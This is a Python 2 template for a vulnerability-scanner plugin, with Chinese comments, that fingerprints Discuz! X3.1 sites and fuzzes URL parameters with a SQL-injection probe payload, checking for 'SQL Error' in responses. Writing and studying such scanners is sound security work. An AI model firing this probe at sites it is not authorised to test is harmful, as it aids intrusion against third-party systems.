# encoding=utf8
from scanner_plugin import *
import util
import time
import re
import sys

'''
所有的插件必须以类的形式来编写
插件类必须继承ScannerPlugin基类，并重写describe()、fingerprint()两个方法，以及audit()或fuzz()中的一个方法
扫描器执行时，通过调用上述三个方法完成扫描工作。
'''
class DemoScanner(ScannerPlugin):  

    
    def __init__(self):
        ScannerPlugin.__init__(self)  # 必须初始化父类
        return

    '''
    重写describe()，通过调用基类的_addDescription()函数，完成poc名称、类型、目标、版本、范围、危害等级 等相关信息描述的添加。
    可以一次加入一个信息描述，也可以一次加入多个信息描述，例如：
    self._addDescription({"name": "Discuz! X3.1 sql inject",
        "module_name": "Discuz_X3.1_sql_inject",
        "type": "webapp",
        "target": "discuz"})

    [参数]
        无
    [返回值]
        无
    '''
    def describe(self):

        '''load_type描述由扫描器内部添加'''
        #self._addDescription({"load_type": "internal"})  # 外部(进程）插件，还是内部(线程)插件。#不同于BPScanner，poc插件数量庞大，应选用internal模式。 value: internal/external
        #self._addDescription({"input": "url"})  # 扫描需要的输入是域名，还是url。大部分poc扫描只需要提供域名host即可），因此默认值为host。 value: host/url
        # self._addDescription({"need_crawling": "false"})  # 扫描是否需要爬虫爬取host所有url。大部分poc扫描只需指定的url而无需爬取所有url，因此默认值为false。 value: True/false
        
        '''这些描述由用户添加，必须添加，缺一不可'''
        self._addDescription({"mode": "fuzz"})  # poc扫描插件是audit模式还是fuzz模式，详见audit()和fuzz()函数说明。 value: audit/fuzz
        self._addDescription({"name": "Discuz! <=X3.1 /path/login.php sql_inject"})  # poc名称采用“框架/应用/语言名称+版本号范围+漏洞路径模块+漏洞类型名称”的形式，例如：Discuz <=X3.1 /path/login.php sql_inject。
        self._addDescription({"type": "webapp"})  # poc属于哪种类型(web应用类、开发框架类、web server类还是开发语言类）。 value: webapp/framework/webserver/language/other
        self._addDescription({"target": "discuz"})  # poc的目标名称，如phpwind、discuz、yii、struts、apache、tomcat、php、java
        self._addDescription({"version": "X3.1"})  # poc版本信息
        self._addDescription({"scope": "<="})  # 版本影响范围是大于version，还是大于等于、等于、小于或小于等于，默认值为等于。value: >/>=/=/</<=
        self._addDescription({"level": LEVEL.CRITICAL})  # poc的危害等级。 value: LEVEL.CRITICAL/LEVEL.WARNING/LEVEL.LOW


    '''
    重写fingerprint()，实现对本poc适用的目标框架和版本的指纹识别
    [参数]
        target: 扫描器传入进来的扫描目标，如url、host、ip等
    [返回值]
        如果扫描目标被识别为poc适用的框架和版本，则返回True；否则返回false。
    '''
    def fingerprint(self, target):
        url = target
        host = util.getHostByUrl(url)
        code, head, body, location, error = util.sendHttpRequest(host)
        if code == 200:
            if re.search("<p>Powered by <strong><a href=\"http://www.discuz.net\">Discuz!</a></strong> <em>X3.1</em></p>", body):
                # 目标站点为discuz X3.1框架，适用于本poc，可以扫描"
                return True
            else:
                return False

    '''
    重写audit()，实现poc的扫描检测。audit()适用于事先可预知漏洞位置，明确指定了query的poc。
    检测时，只需按指定query发送http请求，一步到位，无需fuzz。
    大部分poc都属于此种类型。
    在一个POC检测插件中，audit()与fuzz()选择一个来重写实现即可。
    [参数]
        target: 扫描器传入进来的扫描目标，如url、host、ip等
    [返回值]
        存在漏洞返回True，否则返回False
    '''
    def audit(self, target):
        pass


    '''
    重写fuzz()，实现poc的扫描检测。fuzz()适用于事先无法确切预知漏洞位置的poc。
    扫描器的爬虫在爬取网页过程中，会不断调用此方法，并传入爬取的url、要fuzz的参数、cookie等信息。
    少量poc属于此种类型，例如struts命令执行漏洞。
    在一个POC检测插件中，fuzz()与audit()选择一个来重写实现即可。
    [参数]
        context: 扫描器爬虫在爬取url过程中传入进来的扫描目标相关信息，包含url、要fuzz的参数、cookie、、host绑定、代理列表、任务id等。
        格式如下：
        context = {"url":  "http://www.test.com/index.php?a=1&b=2&c=3",  #
            "param": "b",  # 要fuzz检测的参数
            "method": "GET",
            "post_data": "",  # 如果url是POST型，则此处为post数据，例如x=1&y=2&z=3，同时"param"中为要Fuzz的post数据参数，如"param": "x"
            "cookie": "token=123456; bduss=123456",
            "timeout": 10,
            "referer": "http://www.test.com/",
            "headers": {"User-Agent": "dome", "Accept": "text/html"},
            "host_bind": "www.test1.com:10.0.0.1,www.test2.com:10.0.0.2",
            "proxy": "http://a.proxy.com:8080,https://b.proxy.com:8888"
        }
        
    [返回值]
        存在漏洞返回True，否则返回False
    '''
    def fuzz(self, context):

        url = context["url"]  # 需要fuzz的url,假设为http://www.test.com/index.php?a=aaa&b=bbb&c=ccc
        param = context["param"]  # 需要fuzz的param,假设为b
        payload = "1'+and+'1'%3d'1"

        urlWithPayload = util.fillPayload(url, param, payload, isAppend=True)  
        # 装填payload到url的指定参数上，isAppend为True，则payload追加在原有参数值后，否则直接覆盖掉原有参数值
        # 装填结果为 http://www.test.com/index.php?a=aaa&b=bbb1'+and+'1'%3d'1&c=ccc

        code, head, body, location, error = util.sendHttpRequest(urlWithPayload)
        if code == 200:
            if re.search("\w?SQL Error\w?", body):
                # 发现漏洞,通过调用基类的_addScanResult()方法来保存结果。可多次调用_addScanResult()来保存多个漏洞结果。
                self._addScanResult({"method": context["method"],
                "post_data": context["post_data"],
                "url": urlWithPayload,  # 含有payload的url
                "vul_key": context["param"]})  # 存在漏洞点的参数
                return True
        return False

if __name__ == "__main__":
    
    try:
        demoScanner = DemoScanner()
    except ScannerPluginError, e:
        print e.value
        sys.exit()
    '''
    #  实际使用时，context由爬虫构造并传入给fuzz()
    context = {"url": "http://www.baidu.com/index.php?a=1&b=2&c=3",
    "param": "c",
    "method": "GET",
    "post_data": "",
    "cookie": "token=123456; bduss=123456",
    "timeout": 10,
    "referer": "http://www.test.com/",
    "headers": {"User-Agent": "dome", "Accept": "text/html"},
    "host_bind": "www.test1.com:10.0.0.1,www.test2.com:10.0.0.2",
    "proxy": "http://a.proxy.com:8080,https://b.proxy.com:8888"}

    if demoScanner.fingerprint(context["url"]):
        print "begin fuzz ..."
        demoScanner.fuzz(context)
        print "fuzz is completed"
    else:
        print "target is not suitable for this poc plugin"

    print demoScanner.scanResultList
    '''